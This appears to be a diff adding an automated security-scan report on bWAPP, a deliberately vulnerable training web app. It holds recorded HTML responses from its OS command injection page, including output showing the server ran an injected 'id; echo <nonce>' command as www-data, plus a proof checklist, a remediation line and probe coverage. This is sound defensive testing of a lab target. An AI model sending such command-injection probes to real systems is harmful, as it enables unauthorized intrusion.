+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/commandi.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/commandi.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;option value=&#x27;0&#x27;&gt;----------------------  bWAPP v2.2  -----------------------&lt;/option&gt;&lt;option value=&#x27;1&#x27;&gt;/ A1 - Injection /&lt;/option&gt;&lt;option value=&#x27;2&#x27;&gt;HTML Injection - Reflected (GET)&lt;/option&gt;&lt;option value=&#x27;3&#x27;&gt;HTML Injection - Reflected (POST)&lt;/option&gt;&lt;option value=&#x27;4&#x27;&gt;HTML Injection - Reflected (Current URL)&lt;/option&gt;&lt;option value=&#x27;5&#x27;&gt;HTML Injection - Stored (Blog)&lt;/option&gt;&lt;option value=&#x27;6&#x27;&gt;iFrame Injection&lt;/option&gt;&lt;option value=&#x27;7&#x27;&gt;LDAP Injection (Search)&lt;/option&gt;&lt;option value=&#x27;8&#x27;&gt;Mail Header Injection (SMTP)&lt;/option&gt;&lt;option value=&#x27;9&#x27;&gt;OS Comman</pre></details><details><summary>Transcript r22: POST http://192.168.223.221:8080/commandi.php -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - OS Command Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;OS Command Injection&lt;/h1&gt;
+
+    &lt;form action=&quot;/commandi.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;target&quot;&gt;DNS lookup:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;target&quot; name=&quot;target&quot; value=&quot;www.nsa.gov&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form&quot; value=&quot;submit&quot;&gt;Lookup&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+    &lt;p align=&quot;left&quot;&gt;&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/commandi.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/commandi.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;option value=&#x27;0&#x27;&gt;----------------------  bWAPP v2.2  -----------------------&lt;/option&gt;&lt;option value=&#x27;1&#x27;&gt;/ A1 - Injection /&lt;/option&gt;&lt;option value=&#x27;2&#x27;&gt;HTML Injection - Reflected (GET)&lt;/option&gt;&lt;option value=&#x27;3&#x27;&gt;HTML Injection - Reflected (POST)&lt;/option&gt;&lt;option value=&#x27;4&#x27;&gt;HTML Injection - Reflected (Current URL)&lt;/option&gt;&lt;option value=&#x27;5&#x27;&gt;HTML Injection - Stored (Blog)&lt;/option&gt;&lt;option value=&#x27;6&#x27;&gt;iFrame Injection&lt;/option&gt;&lt;option value=&#x27;7&#x27;&gt;LDAP Injection (Search)&lt;/option&gt;&lt;option value=&#x27;8&#x27;&gt;Mail Header Injection (SMTP)&lt;/option&gt;&lt;option value=&#x27;9&#x27;&gt;OS Comman</pre></details><details><summary>Transcript r23: POST http://192.168.223.221:8080/commandi.php -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - OS Command Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;OS Command Injection&lt;/h1&gt;
+
+    &lt;form action=&quot;/commandi.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;target&quot;&gt;DNS lookup:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;target&quot; name=&quot;target&quot; value=&quot;www.nsa.gov&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form&quot; value=&quot;submit&quot;&gt;Lookup&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+    &lt;p align=&quot;left&quot;&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
+argus9a27ascr
+&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/commandi.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/commandi.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;option value=&#x27;0&#x27;&gt;----------------------  bWAPP v2.2  -----------------------&lt;/option&gt;&lt;option value=&#x27;1&#x27;&gt;/ A1 - Injection /&lt;/option&gt;&lt;option value=&#x27;2&#x27;&gt;HTML Injection - Reflected (GET)&lt;/option&gt;&lt;option value=&#x27;3&#x27;&gt;HTML Injection - Reflected (POST)&lt;/option&gt;&lt;option value=&#x27;4&#x27;&gt;HTML Injection - Reflected (Current URL)&lt;/option&gt;&lt;option value=&#x27;5&#x27;&gt;HTML Injection - Stored (Blog)&lt;/option&gt;&lt;option value=&#x27;6&#x27;&gt;iFrame Injection&lt;/option&gt;&lt;option value=&#x27;7&#x27;&gt;LDAP Injection (Search)&lt;/option&gt;&lt;option value=</pre></details><p><b>Remediation</b><br>Never pass request values to a shell.</p><details><summary><b>Proof grade: proven</b></summary><p class='meta'>Requirement for rce: the output of `id; echo &lt;nonce&gt;` returned by the target, with the nonce tying the output to the probe</p><ul><li>&#10003; proof read from the wire</li><li>&#10003; the target produced the quoted bytes &mdash; <i>from r23</i></li><li>&#10003; a benign command was sent &mdash; <i>exchange r23</i></li><li>&#10003; identity output returned by the target &mdash; <i>&#x27;uid=33(www-data)&#x27; in r23</i></li><li>&#10003; the quoted bytes are the command output &mdash; <i>&#x27;uid=33(www-data)&#x27; carries the identity line</i></li><li>&#10003; the probe nonce came back in the output &mdash; <i>&#x27;argus9a27ascr&#x27; in r23</i></li><li>&#10003; proof command stayed benign</li></ul></details></div>
+<h2>Test coverage</h2>
+<p><b>Probes exercised:</b> <code>probe_cmdi</code>, <code>probe_sqli</code></p>
+<table><tr><th>Endpoint touched</th></tr><tr><td><code>GET /sqli_1.php?action&amp;title</code></td></tr><tr><td><code>POST /commandi.php</code></td></tr></table>
+<table><tr><th>Tool</th><th>Requests</th></tr><tr><td>probe_cmdi</td><td>3</td></tr><tr><td>probe_sqli</td><td>20</td></tr></table>
+<details><summary>Appendix: agent working notes (audit)</summary><pre># Working notes - http://192.168.223.221:8080
+
+</pre></details>
+<p class="meta">Generated by Argus v1.0.0 - every finding
+cites verbatim response bytes verified against the recorded transcript.</p>
+</body></html>
